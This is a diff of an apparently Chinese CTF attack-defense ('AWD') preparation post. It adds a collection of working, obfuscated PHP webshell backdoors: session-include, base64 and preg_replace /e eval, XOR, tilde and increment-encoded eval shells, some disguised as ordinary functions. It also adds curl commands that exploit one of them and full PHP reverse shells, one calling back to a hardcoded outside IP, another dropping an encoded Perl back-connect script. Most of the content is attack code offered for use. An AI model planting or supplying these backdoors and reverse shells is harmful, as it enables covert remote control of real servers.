@@ -3,7 +3,7 @@ title: awd准备工作
 password: awd-prepare
 abbrlink: 12920
 date: 2018-08-21 10:32:18
-tags: 
+tags: ctf
 ---
 
 # 准备工作
@@ -274,6 +274,14 @@ if __name__ == '__main__':
 
 # 有趣 backdoor
 
+参考链接: 
+
+* http://www.likesec.com/2017/12/08/webshell/
+
+* https://www.jianshu.com/p/13cb1d8d0441
+
+## 高隐蔽shell
+
 ```php
 <?php
 session_start();
@@ -285,6 +293,218 @@ if(preg_match('//|./',$_SESSION['PHPSESSID']))
 include(ini_get("session.save_path")."/sess_".$_SESSION['PHPSESSID']);
 ?>
 ```
+
+```
+curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=}?%3E%3C?php%20system($_GET[a]);%20/*"
+这时候，shell就会保存在"session.save_path"."/sess_abc"中
+curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=abc&a=ls"
+即可利用。
+```
+
+## 高隐蔽shell2
+
+```
+<?php
+//pwd=addimg
+$sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
+function CheckSQL( &$val ){ 
+    $v = "select|update|union|set|where|order|and|or";
+    $val = base64_decode( $val );
+}
+CheckSQL( $sss );
+preg_replace('/uploadsafe.inc.php/e','@'.$sss, 'uploadsafe.inc.php');
+?>
+解密后:
+解密后为：if ( isset( $_REQUEST['pass'] )){@eval( base64_decode( $_REQUEST['pass'] ) );}else{@eval( $_REQUEST['addimg'] );}
+```
+
+## 高隐蔽shell3
+
+```
+<?php
+if (!function_exists('get_c1ient_area')) {
+    function get_c1ient_area() {
+        $_SERVER['REM0TE_ADDR'] = 'REM0TE_CREATE_QGV2YWwoJF';
+        $_SERVER['HTTP_CL1ENT_1P'] = 'STR_9QT1NUW2F';
+        $_SERVER['HTTP_X_F0RWARDED_FOR'] = 'BASE_SERVER64_kbV0pOw==';
+        $get_c1ient_area = substr($_SERVER['REM0TE_ADDR'], 7, 7) . "FUNCTION";
+        $getenv = substr($_SERVER['HTTP_CL1ENT_1P'], 0, 4) . "REPLACE";
+        $isset = $getenv('_SERVER', '', substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 0, 14)) . "DECODE";
+        //@eval($_POST[adm])
+        $rea1area = $isset(substr($_SERVER['REM0TE_ADDR'], 14) . substr($_SERVER['HTTP_CL1ENT_1P'], 4) . substr($_SERVER['HTTP_X_F0RWARDED_FOR'], 14));
+        echo $rea1area;
+        $on1inearea = $get_c1ient_area('', $rea1area);
+        $on1inearea();
+        return @$onlinearea;
+    }
+    $on1inearea = get_c1ient_area();
+}
+?>
+解密后:
+@eval($_POST[adm])
+```
+
+```
+<?php
+    # return 32md5 back 6
+    function getMd5($md5 = null) {
+        $key = substr(md5($md5),26);
+        return $key; 
+        } 
+        $array = array(
+            chr(112).chr(97).chr(115).chr(115), //pass
+            chr(99).chr(104).chr(101).chr(99).chr(107), // check
+            chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)    // c451cc
+        );
+        if ( isset($_POST) ){
+            $request = &$_POST;
+        } 
+        
+        elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
+        
+        if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) { 
+            if ( getMd5($request[$array[0]]) == $array[2] ) {  //md5(pass) == c451cc
+                $token = preg_replace (
+                chr(47) . $array[2] . chr(47) . chr(101),  //  /c451cc/e
+                $request[$array[1]], 
+                $array[2]
+            );
+        }
+    }
+?>
+```
+
+```
+<?php
+$MMIC= $_GET['tid']?$_GET['tid']:$_GET['fid'];
+if($MMIC >1000000){
+  die('404');
+}
+if (isset($_POST["\x70\x61\x73\x73"]) && isset($_POST["\x63\x68\x65\x63\x6b"]))
+{
+  $__PHP_debug   = array (
+    'ZendName' => '70,61,73,73', 
+    'ZendPort' => '63,68,65,63,6b',
+    'ZendSalt' => '792e19812fafd57c7ac150af768d95ce'
+  );
+ 
+  $__PHP_replace = array (
+    pack('H*', join('', explode(',', $__PHP_debug['ZendName']))),
+    pack('H*', join('', explode(',', $__PHP_debug['ZendPort']))),
+    $__PHP_debug['ZendSalt']
+  );
+ 
+  $__PHP_request = &$_POST;
+  $__PHP_token   = md5($__PHP_request[$__PHP_replace[0]]);
+ 
+  if ($__PHP_token == $__PHP_replace[2])
+  {
+    $__PHP_token = preg_replace (
+      chr(47).$__PHP_token.chr(47).chr(101),
+      $__PHP_request[$__PHP_replace[1]],
+      $__PHP_token
+    );
+ 
+    unset (
+      $__PHP_debug,
+      $__PHP_replace,
+      $__PHP_request,
+      $__PHP_token
+    );
+ 
+    if(!defined('_DEBUG_TOKEN')) exit ('Get token fail!');
+ 
+  }
+}
+```
+
+## php反射机制（太明显）
+
+```
+<?php
+    /**
+    * eva
+    * l($_POS
+    * T["c"]);
+    * asse
+    * rt
+    */
+    class TestClass { }
+    $rc = new ReflectionClass('TestClass');
+    $str = $rc->getDocComment();
+    $payload = substr($str,strpos($str,'ev'),3);
+    $payload .= substr($str,strpos($str,'l('),7);
+    $payload .= substr($str,strpos($str,'T['),8);
+    $exe = substr($str, strpos($str, 'as'), 4);
+    $exe .= substr($str, strpos($str, 'rt'), 2);
+    
+    $exe($payload);
+?>
+解密后:
+assert(eval($_POST["c"]));
+```
+
+## XOR （太花哨）
+
+```
+<?php
+    @$_++; // $_ = 1
+    $__=("#"^"|"); // $__ = _
+    $__.=("."^"~"); // _P
+    $__.=("/"^"`"); // _PO
+    $__.=("|"^"/"); // _POS
+    $__.=("{"^"/"); // _POST 
+    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
+?>
+```
+
+## 反引号（太花哨）
+
+```
+<?php
+$y = ~"瀸寶崑";    // assert
+$cmd = ~"暅挌挌洖"; // jcmemeda
+$y($_REQUEST[$cmd]);
+?>
+```
+
+## 加号（太花哨）
+
+```
+<?php
+$num = +"";
+$num++; $num++; $num++; $num++;
+$four = $num; // 4
+$num++; $num++;
+$six = $num; // 6
+$_="";
+$_[+$_]++;  // +""为0
+$_=$_.""; // $_为字符串"Array"
+$___=$_[+""];//A
+$____=$___;
+$____++;//B
+$_____=$____;
+$_____++;//C
+$______=$_____;
+$______++;//D
+$_______=$______;
+$_______++;//E
+$________=$_______;
+$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O
+$_________=$________;
+$_________++;$_________++;$_________++;$_________++;//S
+$_=$____.$___.$_________.$_______.$six.$four.'_'.$______.$_______.$_____.$________.$______.$_______;
+$________++;$________++;$________++;//R
+$_____=$_________;
+$_____++;//T
+$__=$___.$_________.$_________.$_______.$________.$_____;
+$__($_("ZXZhbCgkX1BPU1RbY21kXSk=")); 
+//ASSERT(BASE64_DECODE("ZXZhbCgkX1BPU1RbY21kXSk="));  
+//ASSERT(eval($_POST[cmd]));  
+?>
+```
+
+## 内存shell(不死马)
 
 ```php
 <?php
@@ -323,6 +543,8 @@ array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
 };
 ?>          // 不好使
 ```
+
+## 内存shell2
 
 ```php
 <?php  
@@ -652,6 +874,8 @@ RewriteRule ^oldpage.html$ newpage.html [R=301]            网页被永久的移
 
 # PHP反弹shell
 
+## reverse_shell1
+
 ```
 <?php 
     function which($pr) { 
@@ -712,7 +936,197 @@ $res = execute(which('perl')." /tmp/.bc $yourip $yourport &");
 
 然后访问该页面即可。
 
+## reverse_shell2
+
 ```
-<?phpfunction which($pr) {$path = execute("which $pr");return ($path ? $path : $pr);}function execute($cfe) {$res = '';if ($cfe) {if(function_exists('exec')) {@exec($cfe,$res);$res = join("/n",$res);} elseif(function_exists('shell_exec')) {$res = @shell_exec($cfe);} elseif(function_exists('system')) {@ob_start();@system($cfe);$res = @ob_get_contents();@ob_end_clean();} elseif(function_exists('passthru')) {@ob_start();@passthru($cfe);$res = @ob_get_contents();@ob_end_clean();} elseif(@is_resource($f = @popen($cfe,"r"))) {$res = '';while( aliyunzixun@xxx.com($f)) {$res .= @fread($f,1024);}@pclose($f);}}return $res;}function cf($fname,$text){if( aliyunzixun@xxx.com($fname,'w')) {@fputs($fp,@base64_decode($text));@fclose($fp);}} $yourip = "x.x.x.x";$yourport = "2333";$usedb = array('perl'=>'perl','c'=>'c');$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"."hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"."sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"."kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"."KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"."OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";cf('/tmp/.bc',$back_connect);$res = execute(which('perl')." /tmp/.bc $yourip $yourport &;");?>
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '123.207.90.143';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
 ```
 
